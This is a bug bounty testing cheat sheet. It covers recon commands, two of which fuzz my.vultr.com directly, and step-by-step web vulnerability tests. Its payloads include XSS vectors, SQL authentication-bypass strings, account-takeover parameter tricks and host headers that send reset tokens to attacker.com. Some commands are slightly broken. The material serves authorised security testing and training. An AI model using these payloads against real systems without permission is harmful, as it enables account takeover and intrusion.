## Bug Bounty Methodology

**Dorking Search Engine**
- `https://freelancermijan.github.io/reconengine/`
- `https://taksec.github.io/google-dorks-bug-bounty/`
- `https://dorks.faisalahmed.me/#`
  
**Certificate Transparency**
- `https://www.shodan.io/`
- `https://search.censys.io`
- `https://securitytrails.com`
- `https://en.fofa.info/`

**Subdomain Enumeration**
- subfinder -d vulnweb.com >> subdomains_raw.txt
- assetfinder --subs-only vulnweb.com >> subdomains_raw.txt
- findomain -t vulnweb.com >> subdomains_raw.txt
- python3 sublist3r.py -d vulnweb.com -o sublist3r_output.txt
- sort -u subdomains.txt | grep vulnweb.com > subdomains_cleaned.txt
- dnsx -l subdomains_cleaned.txt -o resolved_subdomains.txt --silent
- httpx -l resolved_subdomains.txt -o live_subdomains.txt


**Check Subdomain Takeover Vulnerability**
- subzy run --targets live_subdomains.txt --vuln --output subzy_results.txt
- nuclei -l live_subdomains.txt -t ~/nuclei-templates/http/takeovers/ -o nuclei_takeover_results.txt
- subjack -w live_subdomains.txt -t 100 -timeout 30 -ssl -c ~/BUGBOUNTY/fingerprints.json -v -o subjack_results.txt

**Find IP Address with Domain**
- subfinder -d "example.com" -recursive -all -silent | subprober -ip | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u | tee ips.txt 
- nmap -iL ips.txt -sV

**Directory and File Brute Forcing**

- sudo dirsearch -l live_subdomains.txt \
  --exclude-status 400,401,402,403,404,429,500,501,502,503 \
  --include-status 200,301,302 \
  -e html,php,txt,pdf,js,css,zip,bak,old,log,json,xml,config,env,asp,aspx,jsp,gz,tar,sql,db \
  --full-url --recursive --max-recursion-depth=3 \
  --random-agent \
  --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0)" \
  --header "X-Forwarded-For: 127.0.0.1" \
  -t 20 \
  --output dirsearch_results.txt


- feroxbuster -u https://my.vultr.com/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  --insecure -d 2 -L 4 -e -t 20 \
  --random-agent \
  --rate-limit 5 \
  --silent \
  --output feroxbuster_results.txt

- ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
  -u https://my.vultr.com/FUZZ \
  -fc 400,401,402,403,404,429,500,501,502,503 \
  -mc 200,301,302 \
  -recursion -recursion-depth 2 \
  -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db \
  -rate 50 \
  --timeout 10 \
  -ac \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0)" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -o ffuf_results.txt

**Information Disclosure on Restricted Subdomain**
```
- subfinder -d target | httpx -mc 403 -o 403_sub.txt
- cat 403_sub.txt | dirsearch --stdin --exclude-status=401,404,403,429,500,503 \
  -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,bkp,cache,cgi,conf,csv,html,jar,js,json,jsp,lock,log,rar,sql.gz,sql.zip,sql.tar.gz,tar,tar.bz2,tar.gz,txt,wadl,zip,xml \
  --random-agent --threads 50 -t 10 --exclude-sizes 0B --delay 0.5 -o dir.txt
```

**URL Crawling**
- cat live_subdomains.txt | gau | tee gau.txt
- cat live_subdomains.txt | waybackurls | tee wayback.txt
- waymore -i "live_subdomains.txt" -n -mode U -oU waymore.txt
- cat gau.txt wayback.txt waymore.txt | sort -u > all_urls.txt
- cat all_urls.txt | httprobe -c 50 > live_urls.txt

**Find JavaScript File Vulnerability**
- cat live_urls.txt | grep ".js$" >> js.txt
- nuclei -l js.txt -rl 25 -t ~/nuclei-templates/http/exposures/ -o js_bugs.txt
- nuclei -l live_subdomains.txt -rl 15 -o Nuclei_bugs.txt

## SIGNUP PAGE FUNCTIONALITY VULNERABILITIES 

**1. No Rate Limit at Signup Page**
- Enter your details in signup form and submit the form
- Capture the signup request and send it to intruder
- add $$ to email parameter
- In the payload add different email address
- Fire up intruder and check whether it return 200 ok

**2. Hyper Link Injection Vulnerability**
- Visit the target website's registration page.
- Enter evil.com (or any malicious URL) as the First Name and Last Name field.
- Complete the registration process with valid details.
- Now check  your email  and you notice there is malicious hyperlinks.

**3. Server Side Template Injection**
- Navigate to the Signup page.
- Now, in the First Name field, enter the value {{7*7}}
- Fill in the rest of the values on the Register page and register your account.
- We have used the payload {{7*7}} here to verify that it is being evaluated at the backend.
- Now, wait for the welcome/promotional email to arrive in your Inbox.
- Notice that the email arrives with the Subject as 49.

**4. HTML Injection Vulnerability**
- Visit the target website's input fields (e.g., Registration Page, Feedback Form, Profile Update, or Search Bar).  
- Enter the following payloads on any user input field:  
  - `<h1>welcome</h1>`  
  - `<a href="https://evil.com">Click Me</a>`  
- Verify if the input is displayed directly on the website without escaping or sanitization.  

**5. Reflected XSS on Signup Page and Login Page**
- Go to `https://example.com/signup`.  
- Fill out the signup form but **do not submit** it.  
- Open **Burp Suite** and capture the submit request.  
- Modify the parameter values as follows:  
  - **Email Field**: Replace the email parameter with:  
    ```html
    <img src=x onerror=alert(document.domain)>
    ```
  - **Username Field**: Replace with:  
    ```html
    <svg/onload=confirm(1)>
    ```
  - Additional Payload for Email:  
    ```html
    a7madn1@gmail.com'"><svg/onload=alert(/xss/)>, “><svg/onload=confirm(1)>”@x.y
    ```
- Forward the request and turn the intercept off.  

**6. OAuth Redirect URI Manipulation**
- Go to the target website and initiate the **OAuth authorization flow**.
- Intercept the request using Burp Suite.
- Locate the `redirect_uri` parameter in the intercepted URL.
- Modify the `redirect_uri` value to an attacker-controlled malicious URL -  `https://attacker.com/callback`.
- Forward the modified request to the authorization server and continue with the OAuth flow.
- Observe if the server redirects you to the attacker-controlled website.

**7. Attacker creates an account**
- Attacker creates an account on the client application using the victim's email address (`victim@example.com`).
- The attacker is prompted to verify the email address, but does not complete the verification process.
- The victim register on the client application using a different signup method **OAuth flow** with the same email address (`victim@example.com`).
- The victim logs into the client application via the OAuth flow, successfully creating an account and bypassing the email verification process.
- The attacker logs into the client application using the victim’s email address and the attacker’s password.
- Observe if the attacker gains unauthorized access to the victim's account and can view or manipulate any data added by the victim.

**8. Reusability of an OAuth Access Token**
- Log in to the client application using your credentials via the OAuth flow and capture the access token issued by the authorization server using Burp Suite.
- Log out of the application to terminate your session.
- Intercept the logout request to ensure that no explicit token revocation request is sent to the authorization server.
- Attempt to use the previously captured access token to make an API request (e.g., access a protected resource).
- If the access token is still valid and the server processes the request successfully, the token is reusable post-logout, confirming the vulnerability.

**9. Reuse of Email for Multiple Accounts**
- Go to the target website's signup page.
- Register a new account using an email address (`email@gmail.com`).
- Attempt to create another account using the same email address with an alias (`email+alias@gmail.com`).
- Complete the registration process for both accounts.
- Observe if the system creates two separate accounts for the same email, bypassing validation.

**10. Weak Password Policy**
- Go to the target website's signup page.
- Register a new account with a weak or easily guessable password (e.g., 123456 or password).
- Complete the registration process.
- Log into the account using the weak password.
- Observe if the application allows the use of weak passwords without enforcing a strong password policy.

**11. Lack of Email Verification**
- Go to the target website's signup page.
- Register a new account using a fake or invalid email address (`invalid@fakeemail.com`).
- Complete the registration process without verifying the email address.
- Log into the account and perform normal operations.
- Observe if the account is functional despite the invalid or unverified email.

## PASSWORD RESET PAGE FUCNTIONALITY VULNERABILITIES 

**1. No Rate Limiting on Password Reset functionality**
- Find the reset password page on the web application.
- Enter the email then click reset password
- Intercept this request in burp suite..
- Send it to the intruder and repeat it 50 times.
- You will get 200 OK status.

**2. Denial of service when entering a long password**
- Go Sign up page and Forgot password page
- Fill the form and enter a long string in password
- Click on enter and you’ll get 500 Internal Server errors if it is vulnerable.
- **Reference link** - `https://hackerone.com/reports/840598, https://hackerone.com/reports/738569`

**3. Weak Password Policy on Password Reset Page**
- Go to the target website's Password Reset Page.
- Enter a valid registered email address and submit the password reset request.
- Click on the link to navigate to the password reset form.
- Enter a weak password (e.g., 123456, password, qwerty) in the new password field.
- Log in to the account using the weak password you set during the reset process.

**4. No Rate Limit On Login With Weak Password Policy**
- Create an account with a weak password.
- Log in with your account.
- Capture the request in BurpSuite.
- Send the captured request to Intruder.
- Set payload position in the password field.
- Attempt to brute force the password.
- If successful, the victim's password will be cracked.

**5. Password reset token leakage via referrer**
- Go to the target website and request for password reset.
- Now check your email and you will get your password reset link.
- Click on any social media link you see in that email and password reset page.
- Don't change the password before clicking on any external links like social media links for the same website.
- Capture that request in burp suite, You will find a reset token in the referer header.

**6. Password Reset Token Leak via X-Forwarded-Host**
- Intercept the password reset request in Burp Suite
- Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: `attacker.com`.
- Forward the request with the modified header.
- Look for a password reset URL based on the host header like : `https://attacker.com/reset-password.php?token=TOKEN`.

**7. Reset password link sent over unsecured http protocol**
- Go to the target website and request a password reset.
- Check email, you will get a reset password link.
- Copy that link paste in the notepad and observe the protocol.

**8. Password Reset Link not expiring after changing password**
- First You need to create an account with a Valid Email Address.
- After Creating An Account log out from your Account and Navigate to Forgot Password Page.
- Request a Password Reset Link for your Account.
- Use The Password Reset Link And Change The Password, After Changing the Password Login to Your Account.
- Now Use The Old Password Reset Link To Change The Password Again.
- If You Are Able to Change Your Password Again Then This Is a Bug.

**9. Password Reset Link not expiring after changing the email**
- Send the password reset link to your email.
- Don`t open the password link, just copy it and paste into any editor, Open your account.
- Go to your account settings. Under account, you will see Account Overview.
- Go to the Email and password Option and change the email and verify it.
- After changing the email go to your password reset link which you copied.

**10. Self-XSS on Password Reset Page**
- Go to `https://target.com/forgot-password` and initiate the password reset process.
- Enter the email address where you will receive the password reset link.
- Open your mailbox and click on the password reset link you received.
- On the password reset page, replace the current password with the payload:  
   ```html
   "><img src=x onerror=prompt(document.domain)>- 
- Submit the form and observe if the XSS payload executes.

**11. insufficient validation in password reset tokens.**
- Create two accounts: one for the attacker and one for the victim.
- Go to the target website and request a password reset for the victim's account.
- Open the password reset link sent to the victim's email.
- Change the token in the URL with the attacker's token.
- Check if you are able to change the victim's password using the modified token.
- If successful, this indicates a security flaw or bug in the system.

**12. Self-XSS on Uber Password Reset Page** 
- Go to `https://example.com/forgot-password` and initiate the password reset process.
- Enter your email address and submit the request.
- Open your mailbox and click on the password reset link you received.
- On the password reset page, paste the following payload as your new password:  
   ```html
   "><img src=x onerror=prompt(document.domain)>
- Submit the form and observe if the XSS payload executes.

**13. Account Takeover via Password Reset Functionality**
- Go to the password reset page of the target application.
- Intercept the password reset request using Burp Suite.
- Modify the email parameter in the password reset request with the following payloads one by one:  
   - `email=victim@gmail.com&email=attacker@gmail.com`  
   - `email=victim@gmail.com%20email=attacker@gmail.com`  
   - `email=victim@gmail.com|email=attacker@gmail.com`  
   - `email=victim@gmail.com%0d%0acc:attacker@gmail.com`  
   - `email=victim@gmail.com&code=<attacker's password reset token>`  
- Forward the modified request to the server.
- Check if the attacker’s email receives the password reset link or token.

**14. Missing Expiry for Reset Token**
- Go to the target website's password reset page.
- Submit the request with the victim's email address to trigger a password reset link.
- Wait for the reset email to be received (`victim@example.com`).
- Attempt to use the reset token after a long period (after 24 hours, 1 week, etc.) to reset the password again.
- Observe if the token is still valid and allows password resetting after the expected expiration time.
- If the token works after an extended period, the vulnerability is confirmed.

## EMAIL VERIFICATION FUNCTIONALITY BYPASS

**1. Email verification bypass after signup**
* Sign up on the web application using `attacker@mail.com`.
* You will receive a confirmation email on `attacker@mail.com`, but do not open that link.
* The application may ask for email confirmation. Check if it allows you to navigate to the account settings page without verification.
* On the settings page, check if you can change the email.
* If allowed, change the email to `victim@mail.com`.
* You will be asked to confirm `victim@mail.com` by opening the confirmation link received on `victim@mail.com`. 
* Instead of opening the new link, go to `attacker@mail.com` inbox and open the previously received link.
* If the application verifies `victim@mail.com` using the previous verification link from `attacker@mail.com`, then this is an email verification bypass.

**2. Email Authentication Bypass in the account registration process**
* Create an account with `attacker@gmail.com`. Upon registration, you will receive an email verification link.
* Click the link and verify the attacker account.
* Go to the Edit Profile page and change the email to `victim@gmail.com`.
* After changing the email, log out of the attacker account. You will receive a message: "A verification email has been sent to the new updated email."
* Go to `attacker@gmail.com` inbox and click on the same verification link that was sent to you during initial registration.
* Now go to the login page and enter `attacker@gmail.com` and the attacker’s password.
* If successful, you have bypassed the email authentication.

**3. Email Verification Bypass leads to account takeover**
* Register any email address without verifying it.
* Attempt to register an account again, but use a different method ('Sign up with Google') using the same email address.
* The email verification is successfully bypassed.
* The attacker can now log in using the victim's account, bypassing the verification methods.
* **Reference**: [HackerOne Report 1074047](https://hackerone.com/reports/1074047).

## LOGIN PAGE VULNERABILITIES 
**1. SQL Injection - Authentication Bypass**
- Navigate to the login page of the application.
- In either the username or password field, enter the following payload:
     ```
     admin' OR '1'='1'#
     ```
- After entering the payload, click the **Submit** button.
- If the login page is vulnerable, you should be logged in successfully as an admin.
- The payload used for the authentication bypass is: 
## Resources:
- [Payload List (Auth Bypass)](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt)
- [Web Application Wordlist](https://github.com/p0dalirius/webapp-wordlists/tree/main)

**2. Brute Force Attack **
- Go to the login page of the application.
- Use a tool like Hydra or Burp Suite's Intruder to automate login attempts with common password lists.
- Monitor the login attempts to see if the application allows multiple attempts without rate-limiting or blocking.
- Check for successful login attempts with weak passwords.
- Confirm if the application is vulnerable to brute force attacks due to lack of protection mechanisms.

**3. Account Enumeration and Login Error Messages**
- Go to the login page.
- Try logging in with a valid username and incorrect password.
- Then, try logging in with an invalid username and incorrect password.
- Observe the error messages. If they differ, the application may be vulnerable to account enumeration.

## SESSION MANAGEMENT RELATED VULNERABILITIES

**1. Session Hijacking**
- Create an account on the target application.
- Log into your account using any browser.
- Use a browser extension such as Cookie Editor to view and copy the session cookies.
- Logout of your account in the current browser.
- Open a different browser or private/incognito window.
- Paste the copied cookies using the Cookie Editor extension.
- Refresh the page.
- If you are logged in, the session hijacking vulnerability exists.

**2. Old Session Does Not Expire After Password Change**
- Create an account on the target application.
- Log into your account using two different browsers (e.g., Chrome and Firefox) with the same credentials.
- In the **Chrome** browser, navigate to the account settings and change your password.
- Refresh the session in the Firefox browser.
- If the session in Firefox is still active, the vulnerability exists.

**3. Old Session Does Not Expire After Email Change**
- Create an account on the target application.
- Log into your account using two different browsers (e.g., Chrome and Firefox) with the same credentials.
- In the **Chrome** browser, update your email address in the account settings.
- Refresh the session in the Firefox browser.
- If the session in Firefox is still active, the vulnerability exists.

**4. Session Token in URL**
- Interact with the application and monitor URLs for session tokens.
- Validate if the session token is logged in server logs or sent in the Referer header to external sites.
- Use the session token from the URL in a separate request to verify if it provides access.

**5. Session Timeout Issues**
- Log into the application and note the session ID in the browser's cookies.
- Stay idle for an extended period (e.g., 30 minutes or longer) and attempt to perform an action.
- Validate if the session remains active despite the inactivity.
- Log out and attempt to use the same session ID to validate if the session was invalidated.

## TWO-FACTOR AUTHENTICATION (2FA) FUNCTIONALITY BYPASS

**1. OTP Bypass on Register Account via Response Manipulation**
- Register an account using your mobile number and request an OTP.
- Enter an incorrect OTP and intercept the request in Burp Suite.
- Intercept the response and modify it:
- Original Response: `{"verificationStatus":false,"mobile":9072346577,"profileId":"84673832"}`
- Modified Response: `{"verificationStatus":true,"mobile":9072346577,"profileId":"84673832"}`
- Forward the modified response to bypass OTP verification.

 **2. OTP Bypass via Response Manipulation During Login**
- Attempt to log in using your credentials and wait for the OTP prompt.
- Enter an incorrect OTP and intercept the request using Burp Suite.
- Intercept the response to this request:
- Original Response: `{"error":"Invalid OTP"}`
- Modified Response: `{"status":"success"}`
- Forward the response to bypass the OTP validation and gain access.

 **3. OTP Status Manipulation**
- Register two accounts using different mobile numbers.
- For the first account, enter the correct OTP and intercept the response in Burp Suite:
- Example: `{"status":1}`
- For the second account, enter an incorrect OTP and intercept the response.
- Original Response: `{"status":0}`
- Modified Response: `{"status":1}`
- Forward the modified response to bypass the OTP check and access the account.

**4. OTP Bypass Using Developer’s Check**
- Navigate to the target website’s OTP-based login or registration page.
- Inspect the "Continue" or "Submit" button using browser developer tools.
- Locate the JavaScript function responsible for OTP validation (e.g., `checkOTP(event)`).
- Check the JavaScript code for:
- Hardcoded OTPs.
- Debugging logs or bypass conditions.
- Use the discovered OTP or manipulate the function to bypass the verification.

**5. OTP Reuse**
- Some applications fail to invalidate previous OTPs after a new one is requested.
- Request an OTP and note it down.
- Request a new OTP but use the first OTP to complete verification.

**6. Brute Force Attack**
- Weak implementations may not limit OTP attempts.
- Automate multiple OTP submission attempts using tools like Burp Suite Intruder.
- Use a range of predictable OTP values (e.g., `0000-9999`).

**7. Lack of OTP Expiry**
- If OTPs do not expire, previously used OTPs may still be valid.
- Save an old OTP.
- Test it after several hours or days to see if it still works.

## OPEN REDIRECTION VULNERABILITY
**1. First Method**
* Go to `https://www.private.com`.
* Capture the request in Burp Suite.
* Send this request to the Intruder tab in Burp Suite.
* Set the payload after the domain directly. For example: `private.com/$test$`.
* Replace `$test$` with your open redirect payloads.
* Add all open redirect payloads in the Intruder.
* Click on **Start Attack** and check for a `301` response.
* Payloads link: [Open Redirection Payloads - Medium](https://medium.com/@cyb3rD1vvya/open-redirection-b6c2505f1f44).

**2. Second Method**
- If the application has a user Sign-In/Sign-Up feature, register a user and log in as that user.
- Go to your user profile page (e.g., `samplesite.me/accounts/profile`).
- Copy the profile page's URL. Log out and clear all cookies, then go to the homepage of the site.
- Paste the copied profile URL into the address bar.
- If the site prompts for a login, check the address bar for a login page with a redirect parameter like:
  - `https://samplesite.me/login?next=accounts/profile`
  - `https://samplesite.me/login?retUrl=accounts/profile`
- Try exploiting the parameter by adding an external domain and loading the crafted URL, e.g.:
  - `https://samplesite.me/login?next=https://evil.com/`
  - `https://samplesite.me/login?next=https://samplesite.me@evil.com/` (to bypass a bad regex filter).
- If it redirects to `evil.com`, this confirms an open redirection bug.
- To further test, try to leverage it for XSS. For example: - `https://samplesite.me/login?next=javascript:alert(1);//`

**3. Open Redirect to XSS**
- Open your browser and go to the login page: `https://example.com/login`.
- In the address bar, modify the URL to include the redirect parameter with the payload: 
  - `https://example.com/login?redirect=http://;@google.com`
- Press Enter and observe if you are redirected to `http://google.com`.
- If you are successfully redirected to `http://google.com`, it confirms the open redirection vulnerability.
- Change the redirect URL to test for XSS. For example:
  - `https://example.com/login?redirect=javascript:alert(1)`
- Press Enter to navigate to this URL.
- If the application is vulnerable, after logging in, the JavaScript payload will execute, resulting in an alert pop-up displaying `1`.
- Payloads repository: [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect).

**4. Automation Methoads to Find Open Redirection Vulnerabilities**
- Run the following command to find open redirection vulnerabilities:
```bash
waybackurls vulnweb.com | grep -a -i =http | qsreplace 'http://evil.com' | while read host; do curl -s -L $host -I | grep "evil.com" && echo "$host \033[0;31mVulnerable\n"; done
```
```
subfinder -d target.com | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t ~/nuclei-templates/dast/vulnerabilities/redirect/open-redirect.yaml -l open.txt
```

## Testing Cross Site Scripting (XSS) Vulnerability in Automation
1. Using waybackurls and curl to Test for XSS
```bash
waybackurls testphp.vulnweb.com | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
```
2. Using gospider and dalfox for Automated XSS Testing
```
gospider -S live_subdomains.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee Xss_Result.txt
```
**3. Using waybackurls and gf to Find XSS Payloads**
```
waybackurls http://example.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox file XSS.txt
```
**4. Using waybackurls, qsreplace, and freq for XSS Testing**
```
echo target | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```
**5. Using waybackurls, gf, and dalfox for XSS Detection**
```
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```
**6. Using waybackurls, bhedak, and airixss for XSS Testing**
```
waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```
**7. Using waybackurls and freq for XSS Payload Injection**
```
echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
```
**8. Using httpx, hakrawler, and dalfox for XSS Testing**
```
echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```

**9. New Way To Find Simple Cross-Site Scripting (XSS)**
- Go to `example.com` where you can see the chat system on the right side of the website.
- Locate and click on the "Other Information" section where you are prompted to enter your details.
- In the Full Name field, enter the following XSS payload:
     ```html
     <img src=1 onerror=alert(1)>
     ```
- Enter your email and contact number in the respective fields as required by the form.
- Click the **Submit** or **Process** button to submit the form.
- Upon submission, the injected JavaScript payload will trigger an alert with the message `1`, indicating a successful XSS attack.

## Testing Host Header Injection Vulnerability
**1. Add Extra Header**
```
Host: vulnerable-website.com:attacker-website.com
Host: attacker-website.com.vulnerable-website.com
```
**2. Inject Duplicate Host Headers**
```
Host: vulnerable-website.com
Host: attacker-website.com
```
**3. Supply an Absolute URL**
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: attacker-website.com
```
**4. Add Line Wrapping**
```
GET /example HTTP/1.1
Host: attacker-website.com
Host: vulnerable-website.com
```
**5. Inject Host Override Headers**
```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-website.com
```

# Cross-Site Request Forgery (CSRF) Testing
**1. Common Flaws in CSRF Token Validation**
- Log in to the target application.
- Interact with the functionality requiring a CSRF token.
- Intercept the HTTP request using a proxy tool (e.g., Burp Suite or OWASP ZAP).
- Remove the entire CSRF token parameter from the intercepted request.
- Forward the request and observe whether the application processes it successfully.
- Generate a Proof of Concept (POC) for ethical demonstration.

**2. CSRF Token Not Tied to User Session**
- Log in to the application using Account A in Browser 1.
- Intercept a request with a valid CSRF token.
- Log in using Account B in Browser 2.
- Use the CSRF token from Account A to craft a request for Account B.
- Check if the action succeeds, revealing the token is not tied to the session.

**3. CSRF Token Tied to Non-Session Cookie**
- Intercept a request and note the associated cookies.
- Remove the cookie headers entirely from the intercepted request.
- Replay the request and observe whether the CSRF protection fails.
- Generate a POC based on this behavior for ethical reporting.

**4. Bypassing Referrer-Based CSRF Defenses**
- Intercept a request and identify the `Referer` header.
- Modify the header to simulate a malicious domain.
- Suppress the referrer header using `<meta name="referrer" content="no-referrer">` or similar techniques.
- Replay the request and check for CSRF validation bypass.

**5. Send Null Value in CSRF Token**
- Intercept a request containing the CSRF token.
- Replace the token value with `null` or an empty string.
- Replay the request and check if the server accepts it without proper validation.

**6. Change CSRF Value and Add Same-Length String**
- Intercept a request containing the CSRF token.
- Modify the token value by appending or replacing it with a same-length string.
- Replay the request and observe whether the server accepts the modified token.

**7. Switching Request Methods**
- Intercept a POST request.
- Change the method to GET.
- Remove any `Content-Type` headers if present.
- Replay the request and check if the server executes the action.

**8. Switching Content Types**
- Intercept a JSON or URL-encoded request containing a CSRF token.
- Modify the `Content-Type` header to `multipart/form-data`.
- Replay the request and observe whether the server processes the altered request.

**9. References**
- [OWASP CSRF Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Burp Suite CSRF Testing Guide](https://portswigger.net/web-security/csrf)

## File Upload Functionality Vulnerability Testing 

**1. Stored XSS via File Upload**
- Go to the target application.
- Find the file upload functionality on the website.
- Upload a CSV file or any file extension containing the payload `"><img src=xx onerror=alert(document.domain)>`
- Verify if the XSS payload triggers the alert, indicating a successful injection.

**2. Stored XSS via File Upload**
- Go to the target application.
- Find the file upload functionality on the website.
- Upload a file named payloads containing the payload: `"><img src=xx onerror=alert(document.domain)>`
- Verify if the XSS payload triggers the alert, indicating a successful injection.

**3. File Upload Via XSS!**
- Go to the target application.
- Find the file upload functionality on the website.
- Rename an SVG file containing the following malicious payload to malicious.png
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert("XSS by Suresh");
  </script>
</svg>
```
- Upload the renamed file (malicious.png) via the file upload functionality.
- Access the uploaded file URL.
- Observe that the JavaScript executes in the browser, showing the alert XSS by Suresh.

**4. File Upload Via Open Redirection!**
- Go to the target application.
- Find the file upload functionality on the website.
- Rename an SVG file containing the following payload to redirect.png
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="window.location='https://google.com'">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
```
- Upload the renamed file (redirect.png) via the file upload functionality.
- Access the uploaded file URL.
- Observe that the browser redirects to https://google.com.


